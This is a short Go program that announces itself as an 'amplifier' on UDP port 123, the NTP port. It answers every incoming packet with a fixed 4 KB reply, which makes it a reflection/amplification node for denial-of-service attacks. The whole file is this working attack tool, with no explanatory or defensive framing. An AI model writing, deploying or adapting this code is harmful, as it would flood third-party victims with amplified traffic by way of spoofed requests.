package main

import (
	"fmt"
	"net"
)

const (
	PORT          = ":123"
	RESPONSE_SIZE = 1024 * 4 // 4 KB payload
)

func main() {
	addr, _ := net.ResolveUDPAddr("udp", PORT)
	conn, _ := net.ListenUDP("udp", addr)
	defer conn.Close()

	fmt.Println("🚀 Amplifier aktif di UDP port 123")
	buffer := make([]byte, 512)

	for {
		_, remoteAddr, _ := conn.ReadFromUDP(buffer)
		response := make([]byte, RESPONSE_SIZE)
		for i := range response {
			response[i] = 0x1c
		}
		conn.WriteToUDP(response, remoteAddr)
	}
}
